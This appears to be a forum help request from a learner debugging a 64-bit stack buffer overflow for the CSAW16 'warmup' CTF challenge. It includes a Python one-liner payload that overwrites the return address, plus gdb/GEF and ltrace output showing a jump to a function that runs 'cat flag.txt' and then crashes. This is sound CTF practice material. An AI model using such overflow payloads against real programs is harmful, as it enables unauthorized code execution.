@@ -1,0 +1,211 @@
+Hello good afternoon, I hope I do not cause discomfort, I like the topic of pwning, the problem is that when I try to solve ctf's challenges or ELF 64-bit exercises, and I redirect the execution flow, it enters the address I am looking for, but at pressing 'c' gives me a segmentation fault (in dgb) and ends the execution. This has happened to me for a long time with x64 files, with x32 I have no problem, I even copy the writeups that should work and it always happens the same, basically I see that my desired address is passed to the $ rbp register before the 'ret' instruction, enter on return with that address as parameter but it comes out somewhere else and it tells me this somewhere in the gdb output: $ eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification ...
+
+I currently have this problem ...
+
+https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html (WRITEUP)
+https://github.com/guyinatuxedo/ctf/tree/master/csaw16/pwn/warmup (files)
+
+user @ User-Pc: ~ / home / GIT / IVAN / Pwning / Nightmare / stackOverflow / CSAW16-WARMUP $ file ./warmup
+./warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter / lib64 / l, for GNU / Linux 2.6.24, BuildID [sha1] = ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
+
+gef➤ checksec
+[+] checksec for '/ home / user / home / GIT / IVAN / Pwning / Nightmare / stackOverflow / CSAW16-WARMUP / warmup'
+Canary: No
+NX: No
+FOOT: No
+Fortify: No
+RelRO: Partial
+
+user@User-Pc:~/home/GIT/IVAN/Pwning/Nightmare/stackOverflow/CSAW16-WARMUP$ python -c 'print "0"*64 + "\x0d\x06\x40\x00\x00\x00\x00\x00"' > exp.txt
+user@User-Pc:~/home/GIT/IVAN/Pwning/Nightmare/stackOverflow/CSAW16-WARMUP$ gdb ./warmup 
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+80 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
+
+warning: /home/user/pwndbg/gdbinit.py: No such file or directory
+
+warning: /home/user/pwndbg/gdbinit.py: No such file or directory
+Reading symbols from ./warmup...(no debugging symbols found)...done.
+gef➤  disas main
+Dump of assembler code for function main:
+   0x000000000040061d <+0>:	push   rbp
+   0x000000000040061e <+1>:	mov    rbp,rsp
+   0x0000000000400621 <+4>:	add    rsp,0xffffffffffffff80
+   0x0000000000400625 <+8>:	mov    edx,0xa
+   0x000000000040062a <+13>:	mov    esi,0x400741
+   0x000000000040062f <+18>:	mov    edi,0x1
+   0x0000000000400634 <+23>:	call   0x4004c0 <write@plt>
+   0x0000000000400639 <+28>:	mov    edx,0x4
+   0x000000000040063e <+33>:	mov    esi,0x40074c
+   0x0000000000400643 <+38>:	mov    edi,0x1
+   0x0000000000400648 <+43>:	call   0x4004c0 <write@plt>
+   0x000000000040064d <+48>:	lea    rax,[rbp-0x80]
+   0x0000000000400651 <+52>:	mov    edx,0x40060d
+   0x0000000000400656 <+57>:	mov    esi,0x400751
+   0x000000000040065b <+62>:	mov    rdi,rax
+   0x000000000040065e <+65>:	mov    eax,0x0
+   0x0000000000400663 <+70>:	call   0x400510 <sprintf@plt>
+   0x0000000000400668 <+75>:	lea    rax,[rbp-0x80]
+   0x000000000040066c <+79>:	mov    edx,0x9
+   0x0000000000400671 <+84>:	mov    rsi,rax
+   0x0000000000400674 <+87>:	mov    edi,0x1
+   0x0000000000400679 <+92>:	call   0x4004c0 <write@plt>
+   0x000000000040067e <+97>:	mov    edx,0x1
+   0x0000000000400683 <+102>:	mov    esi,0x400755
+   0x0000000000400688 <+107>:	mov    edi,0x1
+   0x000000000040068d <+112>:	call   0x4004c0 <write@plt>
+   0x0000000000400692 <+117>:	lea    rax,[rbp-0x40]
+   0x0000000000400696 <+121>:	mov    rdi,rax
+   0x0000000000400699 <+124>:	mov    eax,0x0
+   0x000000000040069e <+129>:	call   0x400500 <gets@plt>
+   0x00000000004006a3 <+134>:	leave  
+   0x00000000004006a4 <+135>:	ret    
+End of assembler dump.
+gef➤  break *0x00000000004006a3
+Breakpoint 1 at 0x4006a3
+gef➤  r < exp.txt
+Starting program: /home/user/home/GIT/IVAN/Pwning/Nightmare/stackOverflow/CSAW16-WARMUP/warmup < exp.txt
+-Warm Up-
+WOW:0x40060d
+>[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007fffffffdb50  →  "00000000000000000000000000000000000000000000000000[...]"
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7dcea00  →  0x00000000fbad2088
+$rdx   : 0x00007ffff7dd08d0  →  0x0000000000000000
+$rsp   : 0x00007fffffffdb10  →  "0x40060d"
+$rbp   : 0x00007fffffffdb90  →  0x000000000040060d  →  <easy+0> push rbp
+$rsi   : 0x0000000000602261  →  "00000000000000000000000000000000000000000000000000[...]"
+$rdi   : 0x00007fffffffdb51  →  "00000000000000000000000000000000000000000000000000[...]"
+$rip   : 0x00000000004006a3  →  <main+134> leave 
+$r8    : 0x00000000006022a9  →  0x0000000000000000
+$r9    : 0x0               
+$r10   : 0x70              
+$r11   : 0x246             
+$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
+$r13   : 0x00007fffffffdc70  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdb10│+0x0000: "0x40060d"	 ← $rsp
+0x00007fffffffdb18│+0x0008: 0x000000000000000a
+0x00007fffffffdb20│+0x0010: 0x0000000000000000
+0x00007fffffffdb28│+0x0018: 0x0000000000000000
+0x00007fffffffdb30│+0x0020: 0x0000000000000000
+0x00007fffffffdb38│+0x0028: 0x0000000000000000
+0x00007fffffffdb40│+0x0030: 0x0000000000000000
+0x00007fffffffdb48│+0x0038: 0x0000000000000000
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400694 <main+119>       rex.RB ror BYTE PTR [r8-0x77], 0xc7
+     0x400699 <main+124>       mov    eax, 0x0
+     0x40069e <main+129>       call   0x400500 <gets@plt>
+ →   0x4006a3 <main+134>       leave  
+     0x4006a4 <main+135>       ret    
+     0x4006a5                  nop    WORD PTR cs:[rax+rax*1+0x0]
+     0x4006af                  nop    
+     0x4006b0 <__libc_csu_init+0> push   r15
+     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "warmup", stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4006a3 → main()
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+Breakpoint 1, 0x00000000004006a3 in main ()
+gef➤  c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007ffff7a103db  →  <__libc_start_main+235> mov edi, eax
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x00007fffffffdc88  →  0x00007fffffffe073  →  "CLUTTER_IM_MODULE=xim"
+$rsp   : 0x00007fffffffdb98  →  0x00007fffffffdba0  →  0x0000000000000000
+$rbp   : 0x000000000040060d  →  <easy+0> push rbp
+$rsi   : 0x0               
+$rdi   : 0x0000000000602261  →  "00000000000000000000000000000000000000000000000000[...]"
+$rip   : 0x00007fffffffdb62  →  0x0000a85f87621fa1
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x8               
+$r11   : 0x246             
+$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
+$r13   : 0x00007fffffffdc70  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdb98│+0x0000: 0x00007fffffffdba0  →  0x0000000000000000	 ← $rsp
+0x00007fffffffdba0│+0x0008: 0x0000000000000000
+0x00007fffffffdba8│+0x0010: 0x00602261ffffdc78
+0x00007fffffffdbb0│+0x0018: 0x00007fffffffdb51  →  0x30303030300000a0
+0x00007fffffffdbb8│+0x0020: 0x0000000000000000
+0x00007fffffffdbc0│+0x0028: 0x4b0958d9df0a86e5
+0x00007fffffffdbc8│+0x0030: 0x0000000000400520  →  <_start+0> xor ebp, ebp
+0x00007fffffffdbd0│+0x0038: 0x00007fffffffdc70  →  0x0000000000000001
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7fffffffdb5d                  xor    BYTE PTR [rax], dh
+   0x7fffffffdb5f                  xor    BYTE PTR [rax], al
+   0x7fffffffdb61                  pop    rax
+ → 0x7fffffffdb62                  movabs eax, ds:0xa85f87621f
+   0x7fffffffdb6b                  add    BYTE PTR [rax], al
+   0x7fffffffdb6d                  add    BYTE PTR [rax], al
+   0x7fffffffdb6f                  add    BYTE PTR [rax-0x25], cl
+   0x7fffffffdb75                  jg     0x7fffffffdb77
+   0x7fffffffdb77                  add    BYTE PTR [rax], ah
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "warmup", stopped, reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7fffffffdb62 → movabs eax, ds:0xa85f87621f
+[#1] 0x7fffffffdba0 → add BYTE PTR [rax], al
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x00007fffffffdb62 in ?? ()
+
+Basically the same thing happens to me here, the write up says to padding 72 characters, which for me does not work, it fills the records I need with padding characters, so in padding 64, it loads my desired address to the record , and there it is before the ret, I press 'c' to continue and ... sigsegv.
+
+Yes, it is entering the function I want ...
+
+user@User-Pc:~/home/GIT/IVAN/Pwning/Nightmare/stackOverflow/CSAW16-WARMUP$ python -c 'print "0"*64 + "\x0d\x06\x40\x00\x00\x00\x00\x00"' | ltrace ./warmup
+__libc_start_main(0x40061d, 1, 0x7ffdb1cd0028, 0x4006b0 <unfinished ...>
+write(1, "-Warm Up-\n", 10-Warm Up-
+)                                                                             = 10
+write(1, "WOW:", 4WOW:)                                                                                     = 4
+sprintf("0x40060d\n", "%p\n", 0x40060d)                                                                 = 9
+write(1, "0x40060d\n", 90x40060d
+)                                                                               = 9
+write(1, ">", 1>)                                                                                        = 1
+gets(0x7ffdb1ccff00, 0x400755, 1, 0x7ff60bb78314)                                                       = 0x7ffdb1ccff00
+system("cat flag.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                  = 11
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+I have had this problem on my computer with various linux distros in different versions, ubuntu16-18, kalilinux2016-2019, ZorinOS 15.2, etc.
+
+user @ User-Pc: ~ / home / GIT / IVAN / Pwning / Nightmare / stackOverflow / CSAW16-WARMUP $ uname -a
+Linux User-Pc 5.3.0-42-generic # 34 ~ 18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU / Linux
+
+And I do not know if it is of any use, but as I said, I have had this problem for a long time with my computer, so maybe it has something to do with others because I do not have this problem:
+
+DELL LATITUDE E6420, Intel® Core ™ i5-2410M CPU @ 2.30GHz × 4
+
+I hope someone can help me and thank you very much for your time.
